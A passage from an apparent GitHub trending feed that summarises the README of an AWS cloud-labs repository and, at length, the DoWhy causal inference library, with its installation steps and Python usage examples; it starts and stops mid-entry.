href=&#34;https://github.com/jcpeterson/openwebtext&#34;&gt;jcpeterson&lt;/a&gt; and &lt;a href=&#34;https://github.com/eukaryote31/openwebtext&#34;&gt;eukaryote31&#39;s&lt;/a&gt; work to download urls. We then filtered, cleaned, and deduplicated all downloaded content according to the procedure described in our &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/tools/openwebtext&#34;&gt;openwebtext&lt;/a&gt; directory. For reddit URLs corresponding to content up to October 2018 we arrived at approximately 37GB of content.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>acantril/learn-cantrill-io-labs</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/acantril/learn-cantrill-io-labs</id>
    <link href="https://github.com/acantril/learn-cantrill-io-labs" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Standard and Advanced Demos for learn.cantrill.io courses&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;learn-cantrill-io-labs&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/acantril/learn-cantrill-io-labs/raw/master/demogrid.png&#34; alt=&#34;DEMOGRID&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Welcome .. this repo stores a collection of freely available demos and advanced demos for AWS (and in the future other cloud platforms) These demos are available in two ways&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;here in instruction &amp;amp; architecture diagram form for free&lt;/li&gt; &#xA; &lt;li&gt;as part of &lt;a href=&#34;https://learn.cantrill.io&#34;&gt;https://learn.cantrill.io&lt;/a&gt; courses - including theory lessons and guided videos.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The free versions here are fully functional, with instructions &amp;amp; architecture diagrams and are maintained by me.&lt;/p&gt; &#xA;&lt;p&gt;All demos have a structure ...&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;01_LABSETUP&lt;/code&gt; contains assets required for the DEMO&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;02_LABINSTRUCTIONS&lt;/code&gt; contains text instructions and architecture diagrams&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Video guided versions are available in my courses at &lt;a href=&#34;https://learn.cantrill.io&#34;&gt;https://learn.cantrill.io&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Demo List (Order of creation!)&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/acantril/learn-cantrill-io-labs/tree/master/AWS_HYBRID_AdvancedVPN&#34;&gt;Implement a Dynamic, BGP Based, Highly-Available Site-to-Site VPN&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/acantril/learn-cantrill-io-labs/tree/master/aws-hybrid-activedirectory&#34;&gt;Implement Hybrid Directory - On-premises &amp;amp; AWS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/acantril/learn-cantrill-io-labs/tree/master/aws-hybrid-dns&#34;&gt;Hybrid DNS using Route53 Inbound and Outbound Endpoints&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/acantril/learn-cantrill-io-labs/tree/master/aws-patch-manager&#34;&gt;Patching AWS and On-premises using Systems Manager Patch Manager&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/acantril/learn-cantrill-io-labs/tree/master/aws-elastic-wordpress-evolution&#34;&gt;Web Application Architecture Evolution&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/acantril/learn-cantrill-io-labs/tree/master/aws-serverless-pet-cuddle-o-tron&#34;&gt;Implement a Serverless Application&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/acantril/learn-cantrill-io-labs/tree/master/aws-dms-database-migration&#34;&gt;Database Migration using DMS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/acantril/learn-cantrill-io-labs/tree/master/aws-cognito-web-identity-federation&#34;&gt;Building a serverless application using Web Identity Federation&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt;</summary>
  </entry>
  <entry>
    <title>py-why/dowhy</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/py-why/dowhy</id>
    <link href="https://github.com/py-why/dowhy" rel="alternate"></link>
    <summary type="html">&lt;p&gt;DoWhy is a Python library for causal inference that supports explicit modeling and testing of causal assumptions. DoWhy is based on a unified language for causal inference, combining causal graphical models and potential outcomes frameworks.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;|BuildStatus|_ |PyPiVersion|_ |PythonSupport|_ |Downloads|_&lt;/p&gt; &#xA;&lt;p&gt;.. |PyPiVersion| image:: &lt;a href=&#34;https://img.shields.io/pypi/v/dowhy.svg&#34;&gt;https://img.shields.io/pypi/v/dowhy.svg&lt;/a&gt; .. _PyPiVersion: &lt;a href=&#34;https://pypi.org/project/dowhy/&#34;&gt;https://pypi.org/project/dowhy/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;.. |PythonSupport| image:: &lt;a href=&#34;https://img.shields.io/pypi/pyversions/dowhy.svg&#34;&gt;https://img.shields.io/pypi/pyversions/dowhy.svg&lt;/a&gt; .. _PythonSupport: &lt;a href=&#34;https://pypi.org/project/dowhy/&#34;&gt;https://pypi.org/project/dowhy/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;.. |BuildStatus| image:: &lt;a href=&#34;https://github.com/microsoft/dowhy/workflows/Python%20package/badge.svg&#34;&gt;https://github.com/microsoft/dowhy/workflows/Python%20package/badge.svg&lt;/a&gt; .. _BuildStatus: &lt;a href=&#34;https://github.com/microsoft/dowhy/actions&#34;&gt;https://github.com/microsoft/dowhy/actions&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;.. |Downloads| image:: &lt;a href=&#34;https://pepy.tech/badge/dowhy&#34;&gt;https://pepy.tech/badge/dowhy&lt;/a&gt; .. _Downloads: &lt;a href=&#34;https://pepy.tech/project/dowhy&#34;&gt;https://pepy.tech/project/dowhy&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;DoWhy | An end-to-end library for causal inference&lt;/h1&gt; &#xA;&lt;p&gt;Introducing DoWhy and the 4 steps of causal inference | &lt;code&gt;Microsoft Research Blog &amp;lt;https://www.microsoft.com/en-us/research/blog/dowhy-a-library-for-causal-inference/&amp;gt;&lt;/code&gt;_ | &lt;code&gt;Video Tutorial &amp;lt;https://note.microsoft.com/MSR-Webinar-DoWhy-Library-Registration-On-Demand.html&amp;gt;&lt;/code&gt;_ | &lt;code&gt;Arxiv Paper &amp;lt;https://arxiv.org/abs/2011.04216&amp;gt;&lt;/code&gt;_ | &lt;code&gt;Slides &amp;lt;https://www2.slideshare.net/AmitSharma315/dowhy-an-endtoend-library-for-causal-inference&amp;gt;&lt;/code&gt;_&lt;/p&gt; &#xA;&lt;p&gt;Read the &lt;code&gt;docs &amp;lt;https://py-why.github.io/dowhy/&amp;gt;&lt;/code&gt;_ | Try it online! |Binder|_&lt;/p&gt; &#xA;&lt;p&gt;.. |Binder| image:: &lt;a href=&#34;https://mybinder.org/badge_logo.svg&#34;&gt;https://mybinder.org/badge_logo.svg&lt;/a&gt; .. _Binder: &lt;a href=&#34;https://mybinder.org/v2/gh/microsoft/dowhy/master?filepath=docs%2Fsource%2F&#34;&gt;https://mybinder.org/v2/gh/microsoft/dowhy/master?filepath=docs%2Fsource%2F&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Case Studies using DoWhy&lt;/strong&gt;: &lt;code&gt;Hotel booking cancellations &amp;lt;https://towardsdatascience.com/beyond-predictive-models-the-causal-story-behind-hotel-booking-cancellations-d29e8558cbaf&amp;gt;&lt;/code&gt;_ | &lt;code&gt;Effect of customer loyalty programs &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_example_effect_of_memberrewards_program.ipynb&amp;gt;&lt;/code&gt;_ | &lt;code&gt;Optimizing article headlines &amp;lt;https://medium.com/@akelleh/introducing-the-do-sampler-for-causal-inference-a3296ea9e78d&amp;gt;&lt;/code&gt;_ | &lt;code&gt;Effect of home visits on infant health (IHDP) &amp;lt;https://towardsdatascience.com/implementing-causal-inference-a-key-step-towards-agi-de2cde8ea599&amp;gt;&lt;/code&gt;_ | &lt;code&gt;Causes of customer churn/attrition &amp;lt;https://medium.com/geekculture/a-quickstart-for-causal-analysis-decision-making-with-dowhy-2ce2d4d1efa9&amp;gt;&lt;/code&gt;_&lt;/p&gt; &#xA;&lt;p&gt;.. image:: &lt;a href=&#34;https://raw.githubusercontent.com/microsoft/dowhy/master/docs/images/dowhy-schematic.png&#34;&gt;https://raw.githubusercontent.com/microsoft/dowhy/master/docs/images/dowhy-schematic.png&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;As computing systems are more frequently and more actively intervening in societally critical domains such as healthcare, education, and governance, it is critical to correctly predict and understand the causal effects of these interventions. Without an A/B test, conventional machine learning methods, built on pattern recognition and correlational analyses, are insufficient for decision-making.&lt;/p&gt; &#xA;&lt;p&gt;Much like machine learning libraries have done for prediction, &lt;strong&gt;&#34;DoWhy&#34; is a Python library that aims to spark causal thinking and analysis&lt;/strong&gt;. DoWhy provides a principled four-step interface for causal inference that focuses on explicitly modeling causal assumptions and validating them as much as possible. The key feature of DoWhy is its state-of-the-art refutation API that can automatically test causal assumptions for any estimation method, thus making inference more robust and accessible to non-experts. DoWhy supports estimation of the average causal effect for backdoor, frontdoor, instrumental variable and other identification methods, and estimation of the conditional effect (CATE) through an integration with the EconML library.&lt;/p&gt; &#xA;&lt;p&gt;For a quick introduction to causal inference, check out &lt;code&gt;amit-sharma/causal-inference-tutorial &amp;lt;https://github.com/amit-sharma/causal-inference-tutorial/&amp;gt;&lt;/code&gt;&lt;em&gt;. We also gave a more comprehensive tutorial at the ACM Knowledge Discovery and Data Mining (&lt;code&gt;KDD 2018 &amp;lt;http://www.kdd.org/kdd2018/&amp;gt;&lt;/code&gt;&lt;/em&gt;) conference: &lt;code&gt;causalinference.gitlab.io/kdd-tutorial &amp;lt;http://causalinference.gitlab.io/kdd-tutorial/&amp;gt;&lt;/code&gt;&lt;em&gt;. For an introduction to the four steps of causal inference and its implications for machine learning, you can access this video tutorial from Microsoft Research: &lt;code&gt;DoWhy Webinar &amp;lt;https://note.microsoft.com/MSR-Webinar-DoWhy-Library-Registration-On-Demand.html&amp;gt;&lt;/code&gt;&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Documentation for DoWhy is available at &lt;code&gt;py-why.github.io/dowhy &amp;lt;https://py-why.github.io/dowhy/&amp;gt;&lt;/code&gt;_.&lt;/p&gt; &#xA;&lt;p&gt;.. i here comment toctree:: .. i here comment :maxdepth: 4 .. i here comment :caption: Contents: .. contents:: &lt;strong&gt;Contents&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;News&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;2022.05.27&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;DoWhy now part of PyWhy&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;We have moved DoWhy from microsoft/dowhy to py-why/dowhy. While GitHub will automatically redirect your git command for cloning, pulling, etc., we recommend updating git remotes and bookmarks. Please note that the &lt;strong&gt;documentation&lt;/strong&gt; has now moved to &lt;a href=&#34;https://py-why.github.io/dowhy&#34;&gt;https://py-why.github.io/dowhy&lt;/a&gt; with &lt;strong&gt;no&lt;/strong&gt; redirect from the old URL.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Experimental support for GCM-based inference&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;We have started adding support for graphical causal model-based inference (or in short GCM-based). At the moment, this includes support for interventions, counterfactuals, and attributing distribution changes. As part of this, we also added features for Shapley value estimation and independence tests. We&#39;re still in the process of fleshing everything out, including &lt;code&gt;documentation &amp;lt;https://py-why.github.io/dowhy/gcm/&amp;gt;&lt;/code&gt;&lt;em&gt;. Some of it is already on &lt;code&gt;master &amp;lt;https://github.com/py-why/dowhy&amp;gt;&lt;/code&gt;&lt;/em&gt;, other parts are on feature branches (prefixed with &lt;code&gt;gcm-&lt;/code&gt;) with open pull-requests, other parts will appear as new pull-requests in the next couple of weeks. Be sure to watch this space here as we quickly expand functionality and documentation.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;The need for causal inference&lt;/h2&gt; &#xA;&lt;p&gt;Predictive models uncover patterns that connect the inputs and outcome in observed data. To intervene, however, we need to estimate the effect of changing an input from its current value, for which no data exists. Such questions, involving estimating a &lt;em&gt;counterfactual&lt;/em&gt;, are common in decision-making scenarios.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Will it work? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Does a proposed change to a system improve people&#39;s outcomes?&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Why did it work? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;What led to a change in a system&#39;s outcome?&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;What should we do? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;What changes to a system are likely to improve outcomes for people?&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;What are the overall effects? &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;How does the system interact with human behavior?&lt;/li&gt; &#xA;   &lt;li&gt;What is the effect of a system&#39;s recommendations on people&#39;s activity?&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Answering these questions requires causal reasoning. While many methods exist for causal inference, it is hard to compare their assumptions and robustness of results. DoWhy makes three contributions,&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Provides a principled way of modeling a given problem as a causal graph so that all assumptions are explicit.&lt;/li&gt; &#xA; &lt;li&gt;Provides a unified interface for many popular causal inference methods, combining the two major frameworks of graphical models and potential outcomes.&lt;/li&gt; &#xA; &lt;li&gt;Automatically tests for the validity of assumptions if possible and assesses the robustness of the estimate to violations.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;To see DoWhy in action, check out how it can be applied to estimate the effect of a subscription or rewards program for customers [&lt;code&gt;Rewards notebook &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_example_effect_of_memberrewards_program.ipynb&amp;gt;&lt;/code&gt;&lt;em&gt;] and for implementing and evaluating causal inference methods on benchmark datasets like the &lt;code&gt;Infant Health and Development Program (IHDP) &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_ihdp_data_example.ipynb&amp;gt;&lt;/code&gt;&lt;/em&gt; dataset, &lt;code&gt;Infant Mortality (Twins) &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_twins_example.ipynb&amp;gt;&lt;/code&gt;_ dataset, and the &lt;code&gt;Lalonde Jobs &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_lalonde_example.ipynb&amp;gt;&lt;/code&gt;_ dataset.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;DoWhy support Python 3.6+. To install, you can use pip or conda.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Latest Release&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Install the latest &lt;code&gt;release &amp;lt;https://pypi.org/project/dowhy/&amp;gt;&lt;/code&gt;__ using pip.&lt;/p&gt; &#xA;&lt;p&gt;.. code:: shell&lt;/p&gt; &#xA;&lt;p&gt;pip install dowhy&lt;/p&gt; &#xA;&lt;p&gt;Install the latest &lt;code&gt;release &amp;lt;https://anaconda.org/conda-forge/dowhy&amp;gt;&lt;/code&gt;__ using conda.&lt;/p&gt; &#xA;&lt;p&gt;.. code:: shell&lt;/p&gt; &#xA;&lt;p&gt;conda install -c conda-forge dowhy&lt;/p&gt; &#xA;&lt;p&gt;If you face &#34;Solving environment&#34; problems with conda, then try :code:&lt;code&gt;conda update --all&lt;/code&gt; and then install dowhy. If that does not work, then use :code:&lt;code&gt;conda config --set channel_priority false&lt;/code&gt; and try to install again. If the problem persists, please add your issue &lt;code&gt;here &amp;lt;https://github.com/microsoft/dowhy/issues/197&amp;gt;&lt;/code&gt;_.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Development Version&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;If you prefer the latest dev version, clone this repository and run the following command from the top-most folder of the repository.&lt;/p&gt; &#xA;&lt;p&gt;.. code:: shell&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;pip install -e .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Requirements&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;DoWhy requires the following packages:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;numpy&lt;/li&gt; &#xA; &lt;li&gt;scipy&lt;/li&gt; &#xA; &lt;li&gt;scikit-learn&lt;/li&gt; &#xA; &lt;li&gt;pandas&lt;/li&gt; &#xA; &lt;li&gt;networkx (for analyzing causal graphs)&lt;/li&gt; &#xA; &lt;li&gt;matplotlib (for general plotting)&lt;/li&gt; &#xA; &lt;li&gt;sympy (for rendering symbolic expressions)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you face any problems, try installing dependencies manually.&lt;/p&gt; &#xA;&lt;p&gt;.. code:: shell&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;pip install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Optionally, if you wish to input graphs in the dot format, then install pydot (or pygraphviz).&lt;/p&gt; &#xA;&lt;p&gt;For better-looking graphs, you can optionally install pygraphviz. To proceed, first install graphviz and then pygraphviz (on Ubuntu and Ubuntu WSL).&lt;/p&gt; &#xA;&lt;p&gt;.. code:: shell&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo apt install graphviz libgraphviz-dev graphviz-dev pkg-config&#xA;## from https://github.com/pygraphviz/pygraphviz/issues/71&#xA;pip install pygraphviz --install-option=&#34;--include-path=/usr/include/graphviz&#34; \&#xA;--install-option=&#34;--library-path=/usr/lib/graphviz/&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Sample causal inference analysis in DoWhy&lt;/h2&gt; &#xA;&lt;p&gt;Most DoWhy analyses for causal inference take 4 lines to write, assuming a pandas dataframe df that contains the data:&lt;/p&gt; &#xA;&lt;p&gt;.. code:: python&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;from dowhy import CausalModel&#xA;import dowhy.datasets&#xA;&#xA;# Load some sample data&#xA;data = dowhy.datasets.linear_dataset(&#xA;    beta=10,&#xA;    num_common_causes=5,&#xA;    num_instruments=2,&#xA;    num_samples=10000,&#xA;    treatment_is_binary=True)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;DoWhy supports two formats for providing the causal graph: &lt;code&gt;gml &amp;lt;https://github.com/GunterMueller/UNI_PASSAU_FMI_Graph_Drawing&amp;gt;&lt;/code&gt;_ (preferred) and &lt;code&gt;dot &amp;lt;http://www.graphviz.org/documentation/&amp;gt;&lt;/code&gt;_. After loading in the data, we use the four main operations in DoWhy: &lt;em&gt;model&lt;/em&gt;, &lt;em&gt;estimate&lt;/em&gt;, &lt;em&gt;identify&lt;/em&gt; and &lt;em&gt;refute&lt;/em&gt;:&lt;/p&gt; &#xA;&lt;p&gt;.. code:: python&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# I. Create a causal model from the data and given graph.&#xA;model = CausalModel(&#xA;    data=data[&#34;df&#34;],&#xA;    treatment=data[&#34;treatment_name&#34;],&#xA;    outcome=data[&#34;outcome_name&#34;],&#xA;    graph=data[&#34;gml_graph&#34;])&#xA;&#xA;# II. Identify causal effect and return target estimands&#xA;identified_estimand = model.identify_effect()&#xA;&#xA;# III. Estimate the target estimand using a statistical method.&#xA;estimate = model.estimate_effect(identified_estimand,&#xA;                                 method_name=&#34;backdoor.propensity_score_matching&#34;)&#xA;&#xA;# IV. Refute the obtained estimate using multiple robustness checks.&#xA;refute_results = model.refute_estimate(identified_estimand, estimate,&#xA;                                       method_name=&#34;random_common_cause&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;DoWhy stresses on the interpretability of its output. At any point in the analysis, you can inspect the untested assumptions, identified estimands (if any) and the estimate (if any). Here&#39;s a sample output of the linear regression estimator.&lt;/p&gt; &#xA;&lt;p&gt;.. image:: &lt;a href=&#34;https://raw.githubusercontent.com/microsoft/dowhy/master/docs/images/regression_output.png&#34;&gt;https://raw.githubusercontent.com/microsoft/dowhy/master/docs/images/regression_output.png&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;For a full code example, check out the &lt;code&gt;Getting Started with DoWhy &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_simple_example.ipynb&amp;gt;&lt;/code&gt;_ notebook. You can also use Conditional Average Treatment Effect (CATE) estimation methods from other libraries such as EconML and CausalML, as shown in the &lt;code&gt;Conditional Treatment Effects &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy-conditional-treatment-effects.ipynb&amp;gt;&lt;/code&gt;_ notebook. For more examples of using DoWhy, check out the Jupyter notebooks in &lt;code&gt;docs/source/example_notebooks &amp;lt;https://github.com/microsoft/dowhy/tree/master/docs/source/example_notebooks/&amp;gt;&lt;/code&gt;_ or try them online at &lt;code&gt;Binder &amp;lt;https://mybinder.org/v2/gh/microsoft/dowhy/master?filepath=docs%2Fsource%2F&amp;gt;&lt;/code&gt;_.&lt;/p&gt; &#xA;&lt;h2&gt;GCM-based inference (experimental)&lt;/h2&gt; &#xA;&lt;p&gt;Graphical causal model-based inference, or GCM-based inference for short, is an experimental addition to DoWhy. For details, check out the &lt;code&gt;documentation for the gcm sub-package &amp;lt;https://py-why.github.io/dowhy/gcm&amp;gt;&lt;/code&gt;_. The basic recipe for this API works as follows:&lt;/p&gt; &#xA;&lt;p&gt;.. code:: python&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# 1. Modeling cause-effect relationships as a structural causal model&#xA;#    (causal graph + functional causal models):&#xA;scm = gcm.StructuralCausalModel(nx.DiGraph([(&#39;X&#39;, &#39;Y&#39;), (&#39;Y&#39;, &#39;Z&#39;)])) # X -&amp;gt; Y -&amp;gt; Z&#xA;scm.set_causal_mechanism(&#39;X&#39;, gcm.EmpiricalDistribution())&#xA;scm.set_causal_mechanism(&#39;Y&#39;, gcm.AdditiveNoiseModel(gcm.ml.create_linear_regressor()))&#xA;scm.set_causal_mechanism(&#39;Z&#39;, gcm.AdditiveNoiseModel(gcm.ml.create_linear_regressor()))&#xA;&#xA;# 2. Fitting the SCM to the data:&#xA;gcm.fit(scm, data)&#xA;&#xA;# 3. Answering a causal query based on the SCM:&#xA;results = gcm.&amp;lt;causal_query&amp;gt;(scm, ...)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Where &amp;lt;causal_query&amp;gt; can be one of multiple functions explained in &lt;code&gt;Answering Causal Questions &amp;lt;https://py-why.github.io/dowhy/gcm/user_guide/answering_causal_questions/index.html&amp;gt;&lt;/code&gt;_.&lt;/p&gt; &#xA;&lt;h2&gt;A high-level Pandas API&lt;/h2&gt; &#xA;&lt;p&gt;We&#39;ve made an even simpler API for dowhy which is a light layer on top of the standard one. The goal is to make causal analysis much more like regular exploratory analysis. To use this API, simply import :code:&lt;code&gt;dowhy.api&lt;/code&gt;. This will magically add the :code:&lt;code&gt;causal&lt;/code&gt; namespace to your :code:&lt;code&gt;pandas.DataFrame&lt;/code&gt; s. Then, you can use the namespace as follows.&lt;/p&gt; &#xA;&lt;p&gt;.. code:: python&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;import dowhy.api&#xA;import dowhy.datasets&#xA;&#xA;data = dowhy.datasets.linear_dataset(beta=5,&#xA;    num_common_causes=1,&#xA;    num_instruments = 0,&#xA;    num_samples=1000,&#xA;    treatment_is_binary=True)&#xA;&#xA;# data[&#39;df&#39;] is just a regular pandas.DataFrame&#xA;data[&#39;df&#39;].causal.do(x=&#39;v0&#39;, # name of treatment variable&#xA;                     variable_types={&#39;v0&#39;: &#39;b&#39;, &#39;y&#39;: &#39;c&#39;, &#39;W0&#39;: &#39;c&#39;},&#xA;                     outcome=&#39;y&#39;,&#xA;                     common_causes=[&#39;W0&#39;]).groupby(&#39;v0&#39;).mean().plot(y=&#39;y&#39;, kind=&#39;bar&#39;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;.. image:: &lt;a href=&#34;https://raw.githubusercontent.com/microsoft/dowhy/master/docs/images/do_barplot.png&#34;&gt;https://raw.githubusercontent.com/microsoft/dowhy/master/docs/images/do_barplot.png&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;For some methods, the :code:&lt;code&gt;variable_types&lt;/code&gt; field must be specified. It should be a :code:&lt;code&gt;dict&lt;/code&gt;, where the keys are variable names, and values are &#39;o&#39; for ordered discrete, &#39;u&#39; for un-ordered discrete, &#39;d&#39; for discrete, or &#39;c&#39; for continuous.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:If the&lt;/strong&gt; :code:&lt;code&gt;variable_types&lt;/code&gt; &lt;strong&gt;is not specified we make use of the following implicit conversions:&lt;/strong&gt; ::&lt;/p&gt; &#xA;&lt;p&gt;int -&amp;gt; &#39;c&#39; float -&amp;gt; &#39;c&#39; binary -&amp;gt; &#39;b&#39; category -&amp;gt; &#39;d&#39;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Currently we have not added support for timestamps.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;The :code:&lt;code&gt;do&lt;/code&gt; method in the causal namespace generates a random sample from $P(outcome|do(X=x))$ of the same length as your data set, and returns this outcome as a new :code:&lt;code&gt;DataFrame&lt;/code&gt;. You can continue to perform the usual :code:&lt;code&gt;DataFrame&lt;/code&gt; operations with this sample, and so you can compute statistics and create plots for causal outcomes!&lt;/p&gt; &#xA;&lt;p&gt;The :code:&lt;code&gt;do&lt;/code&gt; method is built on top of the lower-level :code:&lt;code&gt;dowhy&lt;/code&gt; objects, so can still take a graph and perform identification automatically when you provide a graph instead of :code:&lt;code&gt;common_causes&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;For more details, check out the &lt;code&gt;Pandas API &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_causal_api.ipynb&amp;gt;&lt;/code&gt;_ notebook or the &lt;code&gt;Do Sampler &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/do_sampler_demo.ipynb&amp;gt;&lt;/code&gt;_ notebook.&lt;/p&gt; &#xA;&lt;h1&gt;Graphical Models and Potential Outcomes: Best of both worlds&lt;/h1&gt; &#xA;&lt;p&gt;DoWhy builds on two of the most powerful frameworks for causal inference: graphical models and potential outcomes. It uses graph-based criteria and do-calculus for modeling assumptions and identifying a non-parametric causal effect. For estimation, it switches to methods based primarily on potential outcomes.&lt;/p&gt; &#xA;&lt;h2&gt;A unifying language for causal inference&lt;/h2&gt; &#xA;&lt;p&gt;DoWhy is based on a simple unifying language for causal inference. Causal inference may seem tricky, but almost all methods follow four key steps:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Model a causal inference problem using assumptions.&lt;/li&gt; &#xA; &lt;li&gt;Identify an expression for the causal effect under these assumptions (&#34;causal estimand&#34;).&lt;/li&gt; &#xA; &lt;li&gt;Estimate the expression using statistical methods such as matching or instrumental variables.&lt;/li&gt; &#xA; &lt;li&gt;Finally, verify the validity of the estimate using a variety of robustness checks.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;This workflow can be captured by four key verbs in DoWhy:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;model&lt;/li&gt; &#xA; &lt;li&gt;identify&lt;/li&gt; &#xA; &lt;li&gt;estimate&lt;/li&gt; &#xA; &lt;li&gt;refute&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Using these verbs, DoWhy implements a causal inference engine that can support a variety of methods. &lt;em&gt;model&lt;/em&gt; encodes prior knowledge as a formal causal graph, &lt;em&gt;identify&lt;/em&gt; uses graph-based methods to identify the causal effect, &lt;em&gt;estimate&lt;/em&gt; uses&lt;br&gt; statistical methods for estimating the identified estimand, and finally &lt;em&gt;refute&lt;/em&gt; tries to refute the obtained estimate by testing robustness to assumptions.&lt;/p&gt; &#xA;&lt;h2&gt;Key differences compared to available causal inference software&lt;/h2&gt; &#xA;&lt;p&gt;DoWhy brings three key differences compared to available software for causal inference:&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Explicit identifying assumptions&lt;/strong&gt; Assumptions are first-class citizens in 